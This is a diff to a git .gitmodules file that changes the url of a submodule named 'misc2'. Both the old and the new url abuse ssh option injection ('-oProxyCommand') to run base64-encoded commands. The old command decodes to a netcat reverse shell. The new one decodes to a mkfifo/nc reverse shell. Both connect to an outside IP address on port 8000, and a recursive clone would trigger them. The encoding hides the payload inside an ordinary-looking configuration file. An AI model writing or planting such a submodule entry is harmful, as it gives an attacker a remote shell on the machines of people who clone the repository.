@@ -1,3 +1,3 @@
 [submodule "misc2"]
 	path = misc2
-	url = ssh://-oProxyCommand=printf bmMgLWUgL2Jpbi9iYXNoIDEwNy4xOTEuMTE2LjE0MyA4MDAwCg== | base64 -D | sh /wat
+	url = ssh://-oProxyCommand=printf cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTA3LjE5MS4xMTYuMTQzIDgwMDAgPi90bXAvZgo= | base64 -D | sh /wat
